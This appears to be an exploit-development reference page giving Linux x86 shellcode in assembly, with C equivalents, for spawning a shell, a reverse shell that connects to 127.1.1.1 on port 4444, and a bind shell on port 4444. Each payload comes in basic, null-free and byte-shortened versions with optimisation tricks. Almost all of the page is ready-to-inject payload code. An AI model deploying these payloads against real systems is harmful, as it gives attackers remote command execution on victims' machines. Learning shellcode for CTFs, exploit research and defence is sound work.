# Linux x86 Shellcode

## Spawn Shell

### Equivalent C code

```c
execve("/bin/sh", NULL, NULL);
```

### Basic Shellcode

30 bytes, non-null-free

Some tricks:
1. x86 does not support `eip` relative addressing. You need to build the string `"/bin/sh"` on the fly.
    1. Use `push edx` (given that the last byte of `edx` is 0) to add a null byte
    2. Use `push 0x68732f ; push 0x6e69622f` to push `"/bin/sh\0"` onto the stack
    3. Set `ebx` to `esp`

```
mov eax, 0xb
mov ecx, 0x0
mov edx, 0x0
push edx
push 0x68732f
push 0x6e69622f
mov ebx, esp
int 0x80
```

### Null-Free Shellcode

22 bytes, null-free

Some tricks to remove null bytes:
1. `mov ecx, 0x0` → `xor ecx, ecx`
2. `mov eax, 0xb` → `push 0xb ; pop eax`

```
xor ecx, ecx
xor edx, edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push 0xb
pop eax
int 0x80
```

### Null-Free Shortened Shellcode

21 bytes, null-free, shortened

Some tricks to shorten the shellcode:
1. Use `imul ecx` to set `eax` and `edx` to 0 simultaneously (given that `ecx` is 0)

```
xor ecx, ecx
imul ecx
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
add al, 0xb
int 0x80
```

## Reverse Shell

### Equivalent C code

```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4444);
addr.sin_addr.s_addr = inet_addr("127.1.1.1");
connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
dup2(sockfd, 0);
dup2(sockfd, 1);
dup2(sockfd, 2);
execve("/bin/sh", NULL, NULL);
```

### Basic Shellcode

120 bytes, non-null-free

```
BITS 32
; s = socketcall(1, [2, 1, 0]) = socket(2, 1, 0)
mov eax, 0x66
mov ebx, 0x1
push 0x0
push 0x1
push 0x2
mov ecx, esp
int 0x80
; socketcall(3, [s, [2, port, ip], 16]) = connect(s, [2, port, ip], 16)
mov edi, eax
mov eax, 0x66
mov ebx, 0x3
push 0x0101017f  ; ip 127.1.1.1
push word 0x5c11 ; port 4444
push word 0x2
mov ecx, esp
push 0x10
push ecx
push edi
mov ecx, esp
int 0x80
; dup2(s, 0);
mov ecx, 0
mov eax, 0x3f
int 0x80
; dup2(s, 1);
mov ecx, 1
mov eax, 0x3f
int 0x80
; dup2(s, 2);
mov ecx, 2
mov eax, 0x3f
int 0x80
; execve("/bin/sh", 0, 0)
mov eax, 0xb
mov ecx, 0x0
mov edx, 0x0
push edx
push 0x68732f
push 0x6e69622f
mov ebx, esp
int 0x80
```


### Null-Free Shellcode

89 bytes, null-free

Some tricks to remove null bytes:
1. `mov ecx, 0x0` → `xor ecx, ecx`
2. `mov eax, 0x66` → `push 0x66 ; pop eax`

```
; s = socketcall(1, [2, 1, 0]) = socket(2, 1, 0)
push 0x66
pop eax
push 0x1
pop ebx
push 0x0
push 0x1
push 0x2
mov ecx, esp
int 0x80
; socketcall(3, [s, [2, port, ip], 16]) = connect(s, [2, port, ip], 16)
mov edi, eax
push 0x66
pop eax
push 0x3
pop ebx
push 0x0101017f
push word 0x5c11
push word 0x2
mov ecx, esp
push 0x10
push ecx
push edi
mov ecx, esp
int 0x80
; dup2(s, 0)
xor ecx, ecx
push 0x3f
pop eax
int 0x80
; dup2(s, 1)
push 0x1
pop ecx
push 0x3f
pop eax
int 0x80
; dup2(s, 2)
push 0x2
pop ecx
push 0x3f
pop eax
int 0x80
; execve("/bin/sh", 0, 0)
xor eax, eax
xor ecx, ecx
xor edx, edx
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
add al, 0xb
int 0x80
```

### Null-Free Shortened Shellcode

64 bytes, null-free, shortened

Some tricks to shorten the shellcode:

1. `xor edx, edx` → `cdq` (save 1 byte, given that `eax` is a positive number)
2. `mov edi, eax` → `xchg edi, eax` (save 1 byte, given that the value of `eax` is no longer used)
3. `dup2(s, 0)` and `dup2(s, 1)` and `dup2(s, 2)` can be done using a loop
4. Use `pop ecx` to reuse values on the stack (`pop ecx` requires only 1 byte of instruction) 
5. Execute `dup2` first (for stack value reuse)

```
; s = socketcall(1, [2, 1, 0]) = socket(2, 1, 0)
push 0x1
pop ebx
push 0x66
pop eax
cdq
push edx
push ebx
push 0x2
mov ecx, esp
int 0x80
; dup2(c, {2, 1, 0})
pop ecx ; reuse stack variable 2
xchg eax, ebx
loop:
mov al, 0x3f
int 0x80
dec ecx
jns loop
; socketcall(3, [s, [2, port, ip], 16]) = connect(s, [2, port, ip], 16)
push 0x0101017f
push word 0x5c11
push word 0x2
push 0x10
push ecx
push ebx
mov ecx, esp
mov al, 0x66
mov bl, 3
int 0x80
; execve("/bin/sh", 0, 0)
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov ecx, eax
mov al, 0xb
int 0x80
```

## Bind Shell

### Equivalent C code

```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4444);
addr.sin_addr.s_addr = INADDR_ANY;
bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
listen(sockfd, 0);
int new_sockfd = accept(sockfd, NULL, NULL);
dup2(new_sockfd, 0);
dup2(new_sockfd, 1);
dup2(new_sockfd, 2);
execve("/bin/sh", NULL, NULL);
```

### Basic Shellcode

155 bytes, non-null-free

```
; socketcall(1, [2, 1, 0]) = socket(2, 1, 0)
mov ebx, 0x1
push 0x0
push 0x1
push 0x2
mov ecx, esp
mov eax, 0x66
int 0x80
; socketcall(2, [s, [2, port, "0.0.0.0"], 16]) = bind(s, [2, port, "0.0.0.0"], 16)
mov edi, eax
mov ebx, 2
push 0x0
push word 0x5c11
push word 0x2
mov ecx, esp
push 0x10
push ecx
push edi
mov ecx, esp
mov eax, 0x66
int 0x80
; socketcall(4, [s, 0]) = listen(s, 0)
mov ebx, 0x4
push 0x0
push edi
mov ecx, esp
mov eax, 0x66
int 0x80
; c = socketcall(5, [s, 0, 0]) = accept(s, 0, 0)
mov ebx, 0x5
push 0x0
push 0x0
push edi
mov ecx, esp
mov eax, 0x66
int 0x80
; dup2(c, 0)
mov ebx, eax
mov ecx, 0
mov eax, 0x3f
int 0x80
; dup2(c, 1)
mov ecx, 1
mov eax, 0x3f
int 0x80
; dup2(c, 2)
mov ecx, 2
mov eax, 0x3f
int 0x80
; execve("/bin/sh", 0, 0)
mov eax, 0xb
mov ecx, 0x0
mov edx, 0x0
push edx
push 0x68732f
push 0x6e69622f
mov ebx, esp
int 0x80
```

### Null-Free Shellcode

110 bytes, null-free

Some tricks to remove null bytes:
1. `mov ecx, 0x0` → `xor ecx, ecx`
2. `mov ebx, 0x1` → `push 0x1 ; pop ebx`

```
; socketcall(1, [2, 1, 0]) = socket(2, 1, 0)
push 0x1
pop ebx
xor ecx, ecx
push ecx
push 0x1
push 0x2
mov ecx, esp
push 0x66
pop eax
int 0x80
; socketcall(2, [s, [2, port, "0.0.0.0"], 16]) = bind(s, [2, port, "0.0.0.0"], 16)
mov edi, eax
push 0x2
pop ebx
xor ecx, ecx
push ecx
push word 0x5c11
push word 0x2
mov ecx, esp
push 0x10
push ecx
push edi
mov ecx, esp
push 0x66
pop eax
int 0x80
; socketcall(4, [s, 0]) = listen(s, 0)
push 0x4
pop ebx
xor ecx, ecx
push ecx
push edi
mov ecx, esp
push 0x66
pop eax
int 0x80
; c = socketcall(5, [s, 0, 0]) = accept(s, 0, 0)
push 0x5
pop ebx
xor ecx, ecx
push ecx
push ecx
push edi
mov ecx, esp
push 0x66
pop eax
int 0x80
; dup2(c, 0)
mov ebx, eax
xor ecx, ecx
push 0x3f
pop eax
int 0x80
; dup2(c, 1)
push 0x1
pop ecx
push 0x3f
pop eax
int 0x80
; dup2(c, 2)
push 0x2
pop ecx
push 0x3f
pop eax
int 0x80
; execve("/bin/sh", 0, 0)
xor ecx, ecx
xor edx, edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push 0xb
pop eax
int 0x80
```

### Null-Free Shortened Shellcode

78 bytes, null-free, shortened

Some tricks to shorten the shellcode:
1. `xor edx, edx` → `cdq` (save 1 byte, given that `eax` is a positive number)
2. `mov edi, eax` → `xchg edi, eax` (save 1 byte)
3. `dup2(s, 0)` and `dup2(s, 1)` and `dup2(s, 2)` can be done using a loop
4. Save bytes by changing or removing unnecessary instructions
    - e.g. If you already know that 0 ≤ `edx` < 256, you can change `push 0x10 ; pop edx` to `mov dl, 0x10` to save 1 byte (as only the last byte of `edx` will be changed).
    - e.g. If you already know that `esi` will be -1, you can use `inc esi` to set `esi` to 0 instead of `xor esi, esi` to save 1 byte.
5. Reuse values on the stack
    - e.g. If you want to set `ebx` to 2, and the value at the top of the stack is 2, then you can do `pop ebx` instead of `push 0x2 ; pop ebx` to save 2 bytes
    - e.g. If you want to push 0 to the stack, and the value at the top of the stack is already 0, then you don't need to do anything.

```
; socketcall(1, [2, 1, 0]) = socket(2, 1, 0)
push 0x1
pop ebx
push 0x66
pop eax
cdq
push edx
push ebx
push 0x2
mov ecx, esp
int 0x80
; socketcall(2, [s, [2, port, "0.0.0.0"], 16]) = bind(s, [2, port, "0.0.0.0"], 16)
pop ebx
pop edi
xchg edi, eax
push word 0x5c11
push bx
mov ecx, esp
push 0x10
push ecx
push edi
mov ecx, esp
mov al, 0x66
int 0x80
; socketcall(4, [s, 0]) = listen(s, 0)
push edx
push edx
push edi
mov ecx, esp
mov bl, 0x4
mov al, 0x66
int 0x80
; c = socketcall(5, [s, 0, 0]) = accept(s, 0, 0)
inc ebx
mov al, 0x66
int 0x80
; dup2(c, {0, 1, 2})
xchg ebx, eax
pop ecx
loop:
mov al, 0x3f
int 0x80
dec ecx
jns loop
; execve("/bin/sh", 0, 0)
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
inc ecx
mov al, 0xb
int 0x80
```